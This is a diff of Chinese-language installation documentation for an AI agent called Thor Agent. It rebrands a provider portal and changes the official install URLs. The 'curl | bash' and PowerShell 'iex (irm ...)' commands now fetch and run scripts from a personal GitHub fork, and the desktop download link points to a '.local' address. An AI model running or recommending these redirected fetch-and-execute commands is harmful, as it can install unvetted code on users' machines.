@@ -53,7 +53,7 @@ description: "与 Thor Agent 的第一次对话——从安装到开始聊天，
 
 ### 在 macOS 或 Windows 上使用 Thor Desktop 安装器（推荐）
 
-如需同时安装命令行与桌面应用，请从我们的官网[下载 Thor Desktop 安装器](https://thor-agent.nousresearch.com/)并运行。
+如需同时安装命令行与桌面应用，请从我们的官网[下载 Thor Desktop 安装器](https://thor-agent.thor-agent.local/)并运行。
 
 ### 不使用 Thor Desktop：
 
@@ -61,13 +61,13 @@ description: "与 Thor Agent 的第一次对话——从安装到开始聊天，
 
 ```bash
 # Linux / macOS / WSL2
-curl -fsSL https://thor-agent.nousresearch.com/install.sh | bash
+curl -fsSL https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.sh | bash
 ```
 
 源码脚本通过 PM 准备运行时。桌面软件包、Docker、Nix 和 Termux APT 是独立的安装方式。
 请勿使用 `pip install thor-agent` 替代受管理的安装。
 
-Windows 原生安装可在 PowerShell 中运行 `iex (irm https://thor-agent.nousresearch.com/install.ps1)`，无需 WSL。
+Windows 原生安装可在 PowerShell 中运行 `iex (irm https://raw.githubusercontent.com/dwisetyabudi15581/Thor-agent/main/scripts/install.ps1)`，无需 WSL。
 aarch64 Android 设备请使用 [Termux APT 指南](./termux.md)，而非上述脚本。
 
 安装完成后，重新加载 shell：
@@ -86,21 +86,21 @@ source ~/.bashrc   # 或 source ~/.zshrc
 thor model
 ```
 
-:::tip 最简路径：Nous Portal
+:::tip 最简路径：Thor Portal
 一个订阅涵盖 300+ 个模型，以及 [Tool Gateway](../user-guide/features/tool-gateway.md)（网页搜索、图像生成、TTS、云端浏览器）。全新安装时：
 
 ```bash
 thor setup --portal
 ```
 
-该命令一次性完成登录、设置 Nous 为 provider 并开启 Tool Gateway。
+该命令一次性完成登录、设置 Thor 为 provider 并开启 Tool Gateway。
 :::
 
 推荐默认选项：
 
 | Provider | 说明 | 配置方式 |
 |----------|-----------|---------------|
-| **Nous Portal** | 订阅制，零配置 | 通过 `thor model` 进行 OAuth 登录 |
+| **Thor Portal** | 订阅制，零配置 | 通过 `thor model` 进行 OAuth 登录 |
 | **OpenAI Codex** | ChatGPT 或 Codex 订阅，使用 Codex 模型 | 通过 `thor model` → **ChatGPT or Codex Subscription** 进行设备码认证 |
 | **Anthropic** | 直接使用 Claude 模型——Max 计划 + 额外用量积分（OAuth），或按 token 付费的 API key | `thor model` → OAuth 登录（需要 Max + 额外积分），或 Anthropic API key |
 | **OpenRouter** | 跨多个 provider 的多模型路由 | 输入 API key |
